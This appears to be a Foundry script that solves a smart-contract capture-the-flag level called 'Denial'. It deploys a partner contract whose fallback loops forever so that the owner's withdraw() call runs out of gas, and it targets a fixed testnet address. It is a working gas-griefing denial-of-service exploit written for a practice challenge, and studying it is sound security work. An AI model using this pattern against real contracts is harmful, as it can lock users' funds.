// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level20Denial.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective:
// This is a simple wallet that drips funds over time.
// You can withdraw the funds slowly by becoming a withdrawing partner.
// If you can deny the owner from withdrawing funds when they call withdraw()
// (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
contract Partner {
    fallback() external payable {
        while (true) {}
    }
}

contract Level20Solution is Script {
    Denial public denial =
        Denial(payable(0x8926B1177655e2319712C182e25A4c7e5946b128));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        denial.setWithdrawPartner(address(new Partner()));
        denial.withdraw();

        vm.stopBroadcast();
    }
}
// forge script script/Level20Solution.s.sol:Level20Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
